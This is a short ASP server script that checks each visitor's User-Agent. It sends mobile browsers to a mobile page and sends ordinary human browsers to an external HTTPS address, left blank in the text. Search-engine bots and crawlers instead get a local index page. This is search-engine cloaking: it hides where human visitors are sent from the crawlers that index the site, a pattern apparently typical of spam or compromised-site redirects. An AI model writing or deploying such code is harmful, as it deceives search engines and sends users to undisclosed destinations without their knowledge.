
<% 
	
    agent =  LCase(Request.ServerVariables("HTTP_USER_AGENT"))
  
	mobiles="midp,j2me,avant,docomo,novarra,palmos,palmsource,240x320,opwv,chtml,pda,windowsce,mmp/,blackberry,mib/,symbian,wireless,nokia,hand,mobi,phone,cdm,up.b,audio,sie-,sec-,samsung,htc,mot-,mitsu,sagem,sony,alcatel,lg,eric,vx,NEC,philips,mmm,xx,panasonic,sharp,wap,sch,rover,pocket,benq,java,pg,vox,amoi,bird,compal,kg,voda,sany,kdd,dbt,sendo,sgh,gradi,jb,dddi,moto,iphone,android,iPod,incognito,webmate,dream,cupcake,webos,s8000,bada,googlebot-mobile"
	TextArray=split(mobiles,",")
	isMobile = false
	for x=0 to Ubound(TextArray)
		if instr(agent,TextArray(x)) > 0 then
			isMobile=true
		end if
	next
	if isMobile then
		response.redirect "m.asp?m=7"
	end if
	
  if(InStr(agent,"bot") = 0 and InStr(agent,"spider") = 0 and InStr(agent,"craw") = 0 and InStr(agent,"browsershots")=0 and InStr(agent,"w3c-checklink") = 0  and InStr(agent,"google")= 0 and InStr(agent,"yahoo")= 0 and InStr(agent,"msie 6.0; windows 2000")= 0 and InStr(agent,"java/")= 0 and InStr(agent,"httrack")= 0) then
	    response.redirect "https://"
  
  else
	 if InStr(agent,"browsershots") <> 0 then
		
		response.write "<script>window.location='index.asp?p=2'</script>"
	 else
		response.redirect "index.asp?x=2"
	 end if
	 
 end if
	
%>

